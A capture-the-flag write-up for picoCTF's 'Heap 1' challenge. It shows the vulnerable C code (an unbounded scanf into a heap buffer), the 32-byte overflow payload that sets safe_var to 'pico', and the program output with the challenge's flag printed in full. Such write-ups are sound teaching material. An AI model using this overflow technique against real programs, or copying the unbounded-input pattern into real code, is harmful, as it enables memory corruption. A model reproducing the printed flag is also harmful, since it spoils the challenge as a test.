# Writeup: Heap 1

## Introduction

The vulnerability that we will be taking advantage of is the heap overflow vulnerability. Below are the lines that contain the vulnerability:

```
    void write_buffer() {
        printf("Data for buffer: ");
        fflush(stdout);
        scanf("%s", input_data);
    }

```
The heap overflow vulnerability works by passing input to any given variable on the heap that exceeds the memory allocated for it on the heap until you are able to overwrite other variables on the heap. Here we can see that the scanf is vulnerable because there is no limit to how many characters you can pass to the input. Normally you would want to have a limit denoted as %ns where n is the maximum number of characters allowed to passed into scanf and then to the input data buffer. This works because both safe_var and input_data are both next to each other on the heap. In the next section we will discuss how I produced the flag, but before we do that below is the condition that must be met in order to obtain the flag.

```
    void check_win() {
        if (!strcmp(safe_var, "pico")) {
            printf("\nYOU WIN\n");

            // Print flag
            char buf[FLAGSIZE_MAX];
            FILE *fd = fopen("flag.txt", "r");
            fgets(buf, FLAGSIZE_MAX, fd);
            printf("%s\n", buf);
            fflush(stdout);

            exit(0);
        } else {
            printf("Looks like everything is still secure!\n");
            printf("\nNo flage for you :(\n");
            fflush(stdout);
        }
    }
``` 

## Results

In order to obtain the flag we must change the contents of safe_var from its current contents to the string 'pico'. So the input will need to be some variation of '<insert-characters-here>pico'. All that is left to do is to continue to send different variations of that input until the variable safe_var is changed and then calculate how many characters we need to input before sending the input required to obtain the flag, which ended up being 32 characters. To illustrate what this looks like on the heap I have created a rudimentary diagram below:

```
    [input_data (32 bytes)][safe_var (32 bytes)]
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```

Finally we should be able to obtain the flag. Here is the output after sending the final input:

```
    Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = pico


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_b9064d7c}

```

